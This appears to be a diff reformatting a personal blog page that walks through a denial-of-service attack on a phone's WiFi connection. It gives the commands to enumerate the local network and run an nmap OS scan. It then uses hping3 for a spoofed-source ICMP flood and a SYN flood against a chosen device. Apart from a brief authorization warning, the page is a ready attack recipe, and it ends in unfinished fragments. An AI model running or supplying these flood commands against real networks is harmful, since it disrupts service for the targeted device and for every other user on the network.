@@ -1,106 +1,188 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-    <title>hping3</title>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+    <title>~/security/hping3</title>
   </head>
-  <body style="background-color: black;">
-    <p><span style="color: white;">HHfjlsdjdjfldks</span></p>
-    <p><span style="color: white;">Using hping3 to DoS a phone's Wifi
-        connection:</span></p>
-    <p><span style="color: white;">First, I need to list out the active devices
-        on the local network<br>
-      </span></p>
-    <p><span style="color: white;">$ ifconfig</span></p>
-    <p><span style="color: white;">...<br>
-      </span></p>
-    <p><span style="color: white;">wlan0:
-        flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;&nbsp; mtu 1500<br>
+  <body style="background-color: black; color: white">
+    <a href="https://elvindsouza.github.io">~</a>
+    <h1>hping3</h1>
+    <p>
+      <span style="color: white"
+        >Using hping3 to conduct a DoS attack on a phone's wireless(WiFi)
+        connection:</span
+      >
+    </p>
+    <p>
+      <span style="color: white"
+        >First, I need to enumerate the active devices on the local network<br />
+      </span>
+    </p>
+    <p><span style="color: white">$ ifconfig</span></p>
+    <p>
+      <span style="color: white">...<br /> </span>
+    </p>
+    <p>
+      <span style="color: white"
+        >wlan0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;&nbsp; mtu
+        1500<br />
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inet 192.168.0.117&nbsp;
-        netmask 255.255.255.0&nbsp; broadcast 192.168.0.255<br>
+        netmask 255.255.255.0&nbsp; broadcast 192.168.0.255<br />
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inet6
         fe80::80d5:9681:4291:d03f&nbsp; prefixlen 64&nbsp; scopeid
-        0x20&lt;link&gt;<br>
+        0x20&lt;link&gt;<br />
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ether 38:68:93:41:54:10&nbsp;
-        txqueuelen 1000&nbsp; (Ethernet)<br>
+        txqueuelen 1000&nbsp; (Ethernet)<br />
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RX packets 119716&nbsp; bytes
-        167593185 (159.8 MiB)<br>
+        167593185 (159.8 MiB)<br />
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RX errors 0&nbsp; dropped
-        1&nbsp; overruns 0&nbsp; frame 0<br>
+        1&nbsp; overruns 0&nbsp; frame 0<br />
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TX packets 39879&nbsp; bytes
-        4895980 (4.6 MiB)<br>
+        4895980 (4.6 MiB)<br />
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TX errors 0&nbsp; dropped 0
-        overruns 0&nbsp; carrier 0&nbsp; collisions 0<br>
-      </span></p>
-    <p><span style="color: white;">...<br>
-      </span></p>
-    <p><span style="color: white;">I am connected to the network using my
-        Laptop's wifi card(wlan0)</span></p>
-    <p><span style="color: white;">the second line gives us all the information
-        we need-local IP address, netmask and broadcast address</span></p>
-    <p><span style="color: white;">The aim of this is to avoid collecting
-        information on and trying to attack your own connection</span></p>
-    <p><span style="color: white;">We will use the subnet mask and local IP
-        address to craft and scan a range of possible IP addresses on the
-        network. I used nmap here to run an OS detection swab of this range
-        with-<br>
-      </span></p>
-    <p><span style="color: white;"><br>
-      </span></p>
-    <p><span style="color: white;"># nmap&nbsp; -O 192.168.0.0-255</span></p>
-    <p><span style="color: white;"><br>
-      </span></p>
-    <p><span style="color: white;">(you <em>could </em>do a ping scan with
-        (-sn) and then attempt OS detection manually for hosts you are
-        interested in)<br>
-      </span></p>
-    <p><span style="color: white;">I will not paste the output of the scan here,
-        but I found the host I want to target-192.168.0.192<br>
-      </span></p>
-    <p><span style="color: white;">Now is where the fun begins. I will use <a href="www.hping.org"
-          target="_blank">hping3</a> and use source-IP spoofing to create a DoS,
-        after deciding what options to use</span></p>
-    <address><span style="color: white;">-1 ICMP mode, "just werks"</span></address>
-    <address><span style="color: white;">--interface INTRFC necessary to use the
-        --rand-dest option</span></address>
-    <address><span style="color: white;">--rand-dest with preceeding x.x.x.x
-        will craft a random destination IP address with the rule,
-        0&lt;=x&lt;=255 for each x in IP</span></address>
-    <address><span style="color: white;">-a IP_ADDR specifies the spoofed source
-        IP address which will receive responses</span></address>
-    <address><span style="color: white;">--flood to send packets as fast as
-        possible<br>
-      </span></address>
-    <address><span style="color: white;">(for more options, see HPING(8))</span></address>
-    <p style="text-align: left;"><span style="color: white;"># hping3 -1 --flood
-        --interface wlan0 -a 192.168.0.192 x.x.x.x --rand-dest<br>
-      </span></p>
-    <p><span style="color: white;"><br>
-      </span></p>
-    <p><span style="color: white;"><strong>WARNING! OBTAIN AUTHORIZATION BEFORE
-          TRYING OUT ANY SORT OF DoS!</strong></span></p>
-    <p><span style="color: white;"><strong>ICMP ATTACKS CONSUME BANDWIDTH AND
-          THIS CAN CAUSE A DoS FOR ALL DEVICES ON THE NETWORK</strong></span></p>
-    <p><span style="color: white;"><strong> </strong>A more targeted attack is
-        a SYN flood attack. We can attempt to DoS a target device or service
-        with substantially less traffic than other DoS attacks<br>
-      </span></p>
-    <p><span style="color: white;"><br>
-      </span></p>
-    <p><span style="color: white;">-S specifies <strong>SYN </strong>(of the
-        TCP/IP handshake)<br>
-      </span></p>
-    <p><span style="color: white;"># hping3 -S --flood -V 192.168.0.192<br>
-      </span></p>
-    <p><span style="color: white;">This<br>
-      </span></p>
-    <p><span style="color: white;">-p 443<br>
-      </span></p>
-    <p><span style="color: white;"><br>
-      </span></p>
-    <p><span style="color: white;"><br>
-      </span></p>
-    <p><span style="color: white;"><span style="color: black;"></span></span><br>
+        overruns 0&nbsp; carrier 0&nbsp; collisions 0<br />
+      </span>
+    </p>
+    <p>
+      <span style="color: white">...<br /> </span>
+    </p>
+    <p>
+      <span style="color: white"
+        >I am connected to the network using my Laptop's wifi card(wlan0)</span
+      >
+    </p>
+    <p>
+      <span style="color: white"
+        >the second line gives us all the information we need-local IP address,
+        netmask and broadcast address</span
+      >
+    </p>
+    <p>
+      <span style="color: white"
+        >The aim of this is to avoid collecting information on and trying to
+        attack your own connection</span
+      >
+    </p>
+    <p>
+      <span style="color: white"
+        >We will use the subnet mask and local IP address to craft and scan a
+        range of possible IP addresses on the network. I used nmap here to run
+        an OS detection swab of this range with-<br />
+      </span>
+    </p>
+    <p>
+      <span style="color: white"><br /> </span>
+    </p>
+    <p><span style="color: white"># nmap&nbsp; -O 192.168.0.0-255</span></p>
+    <p>
+      <span style="color: white"><br /> </span>
+    </p>
+    <p>
+      <span style="color: white"
+        >(you <em>could </em>do a ping scan with (-sn) and then attempt OS
+        detection manually for hosts you are interested in)<br />
+      </span>
+    </p>
+    <p>
+      <span style="color: white"
+        >I will not paste the output of the scan here, but I found the host I
+        want to target-192.168.0.192<br />
+      </span>
+    </p>
+    <p>
+      <span style="color: white"
+        >Now is where the fun begins. I will use
+        <a href="www.hping.org" target="_blank">hping3</a> and use source-IP
+        spoofing to create a DoS, after deciding what options to use</span
+      >
+    </p>
+    <address>
+      <span style="color: white">-1 ICMP mode, "just werks"</span>
+    </address>
+    <address>
+      <span style="color: white"
+        >--interface INTRFC necessary to use the --rand-dest option</span
+      >
+    </address>
+    <address>
+      <span style="color: white"
+        >--rand-dest with preceeding x.x.x.x will craft a random destination IP
+        address with the rule, 0&lt;=x&lt;=255 for each x in IP</span
+      >
+    </address>
+    <address>
+      <span style="color: white"
+        >-a IP_ADDR specifies the spoofed source IP address which will receive
+        responses</span
+      >
+    </address>
+    <address>
+      <span style="color: white"
+        >--flood to send packets as fast as possible<br />
+      </span>
+    </address>
+    <address>
+      <span style="color: white">(for more options, see HPING(8))</span>
+    </address>
+    <p style="text-align: left">
+      <span style="color: white"
+        ># hping3 -1 --flood --interface wlan0 -a 192.168.0.192 x.x.x.x
+        --rand-dest<br />
+      </span>
+    </p>
+    <p>
+      <span style="color: white"><br /> </span>
+    </p>
+    <p>
+      <span style="color: white"
+        ><strong
+          >WARNING! OBTAIN AUTHORIZATION BEFORE TRYING OUT ANY SORT OF
+          DoS!</strong
+        ></span
+      >
+    </p>
+    <p>
+      <span style="color: white"
+        ><strong
+          >ICMP ATTACKS CONSUME BANDWIDTH AND THIS CAN CAUSE A DoS FOR ALL
+          DEVICES ON THE NETWORK</strong
+        ></span
+      >
+    </p>
+    <p>
+      <span style="color: white"
+        ><strong> </strong>A more targeted attack is a SYN flood attack. We can
+        attempt to DoS a target device or service with substantially less
+        traffic than other DoS attacks<br />
+      </span>
+    </p>
+    <p>
+      <span style="color: white"><br /> </span>
+    </p>
+    <p>
+      <span style="color: white"
+        >-S specifies <strong>SYN </strong>(of the TCP/IP handshake)<br />
+      </span>
+    </p>
+    <p>
+      <span style="color: white"
+        ># hping3 -S --flood -V 192.168.0.192<br />
+      </span>
+    </p>
+    <p>
+      <span style="color: white">This<br /> </span>
+    </p>
+    <p>
+      <span style="color: white">-p 443<br /> </span>
+    </p>
+    <p>
+      <span style="color: white"><br /> </span>
+    </p>
+    <p>
+      <span style="color: white"><br /> </span>
+    </p>
+    <p>
+      <span style="color: white"><span style="color: black"></span></span><br />
     </p>
   </body>
 </html>
